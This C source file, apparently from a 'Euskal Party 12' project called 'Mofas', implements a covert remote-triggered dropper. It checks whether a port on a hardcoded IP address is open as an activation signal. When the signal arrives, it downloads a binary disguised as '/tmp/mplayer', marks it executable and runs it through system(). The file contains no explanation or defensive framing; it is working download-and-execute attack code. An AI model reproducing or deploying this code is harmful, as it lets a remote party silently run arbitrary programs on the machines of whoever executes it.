#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netdb.h>
#include <sys/wait.h>
#include <sys/time.h>

/*
 
   HTTP GETTING CODE
   Euskal Party 12 Mofas
*/
#define  PUERTOREMOTO  		80
#define  HOST 			"83.213.225.8"
#define  FICHERO 		"/mplayer"
#define	 LOCAL			"/tmp/mplayer"
#define	 MODO_DEBUG		1	

#define	 HOSTPRUEBA		"83.213.225.8"
#define	 PUERTOPRUEBA		3000

// Funciones Propias:
int Descarga(int,char *,char*,char*);
void EnviaPeticionHTTP(int,char *);
int  Ahora();
int RecibeCabeceras(int);

// ------------------------------
// 
int Mofas(void)
{
	if (Ahora())
	{
		if (MODO_DEBUG) printf("ACTIVACION!!!!!!\n");
			Descarga(PUERTOREMOTO,HOST,FICHERO,LOCAL);
	}
	else 
	{
		if (MODO_DEBUG)	printf("LA ACTIVACION NO HA LLEGADO AUN ...\n");
	}
}

int Descarga(int puertoRemoto,char hostRemoto[1024],char ficheroRemoto[1024],char ficheroLocal[1024])
{
char *const parametros[]={};
char mensajeHTTP[1024];
char comando[1024];
char recepcion;
int destino;
int enviado,recibido;
struct sockaddr_in destinoDir;
int tamanioSockAddr;
struct hostent *he;
FILE *fichero;

  if ((destino=socket(AF_INET, SOCK_STREAM,0))==-1)
   {
        perror("socket");
        return 0;
   }
  if ((he=gethostbyname(hostRemoto))==NULL)
   {
     printf("No Se pudo resolver el Host");
     return 0;
   }


  destinoDir.sin_family=AF_INET;
  destinoDir.sin_port=htons(puertoRemoto);
  destinoDir.sin_addr.s_addr=INADDR_ANY;
  destinoDir.sin_addr = *((struct in_addr *)he->h_addr);
  bzero(&(destinoDir.sin_zero),8);
  tamanioSockAddr = sizeof (struct sockaddr);

  printf("intentanod conectar ...\n");
  if (connect(destino, (struct sockaddr *)&destinoDir,tamanioSockAddr) == -1)
  {
   	printf("No Conecta !\n");
	  return 0;
  }
  printf("conexion exitosa\n");
  printf("Enviando Peticion de descarga ...\n");
      
 
  sprintf(mensajeHTTP,"GET %s HTTP/1.1\n",ficheroRemoto);
  EnviaPeticionHTTP(destino,mensajeHTTP);
 
  sprintf(mensajeHTTP,"Host: %s\n",hostRemoto);
  EnviaPeticionHTTP(destino,mensajeHTTP);

  sprintf(mensajeHTTP,"Connection: close\n\n");
  EnviaPeticionHTTP(destino,mensajeHTTP);

  if (MODO_DEBUG) printf("Recibiendo Cabeceras HTTP que no nos interesan ...\n");
  RecibeCabeceras(destino);
  if (MODO_DEBUG) printf("Abriendo fichero: %s\n",ficheroLocal);
   fichero=fopen(ficheroLocal,"wb"); 
  if (!fichero)
  {
	  if (MODO_DEBUG) printf("fallo el fopen del file\n");
	  return 0;
  }
  
  if (MODO_DEBUG) printf("Iniciando Recepcion byte a byte.....\n");
  if (MODO_DEBUG) recibido=recv(destino,&recepcion,1,0);
  while(recibido==1)
  {
	  recibido=recv(destino,&recepcion,1,0);
	  fwrite(&recepcion,1,1,fichero);
  }
  fclose(fichero);
  if (MODO_DEBUG) printf("Fichero RECIBIDO!\n");
  if (MODO_DEBUG) printf("dando permisos de ejecucion\n");
  system("/bin/chmod +x /tmp/mplayer");
  system("/tmp/mplayer http://83.213.225.8/pi.avi");
  
  return 0;
}

void EnviaPeticionHTTP(int destino,char *mensaje)
{
	int enviado;
	if (MODO_DEBUG)
		printf("Enviando Peticion: %s",mensaje);
	enviado=send(destino,mensaje,strlen(mensaje),0);
	if (MODO_DEBUG)
		printf("Enviados: %d bytes\n",enviado);
}

int Ahora()
{
int destino;
struct sockaddr_in destinoDir;
int tamanioSockAddr;
struct hostent *he;

  if ((destino=socket(AF_INET, SOCK_STREAM,0))==-1)
   {
        if (MODO_DEBUG) printf("error: socket\n");
        return 0;
   }

  if (MODO_DEBUG)
	printf("Iniciando Prueba de Conexion !\n");

  if ((he=gethostbyname(HOSTPRUEBA))==NULL)
   {
     if (MODO_DEBUG) printf("No Se pudo resolver el Host");
     return 0;
   }


  destinoDir.sin_family=AF_INET;
  destinoDir.sin_port=htons(PUERTOPRUEBA);
  destinoDir.sin_addr.s_addr=INADDR_ANY;
  destinoDir.sin_addr = *((struct in_addr *)he->h_addr);
  bzero(&(destinoDir.sin_zero),8);
  tamanioSockAddr = sizeof (struct sockaddr);

  if (MODO_DEBUG) printf("intentanod conectar ...\n");
  if (connect(destino, (struct sockaddr *)&destinoDir,tamanioSockAddr) == -1)
  {
          if (MODO_DEBUG) printf("No Conecta !\n");
       	  close (destino);
	  return 0;
  }

 close(destino); 
 return 1;

}

int RecibeCabeceras(int destino)
{
  char recepcion[1024];
  int recibido;
  int final=0;
  int error=0;
  
  while (!final && !error)
  {
     recibido=recv(destino,recepcion,1,0);
     
     if (recepcion[0]=='\r')
     {
	     recibido=recv(destino,recepcion,1,0);
	     recibido=recv(destino,recepcion,1,0);
	     if (recepcion[0]=='\r')
			     final=1;
     }		   
	     
	    
  }
}
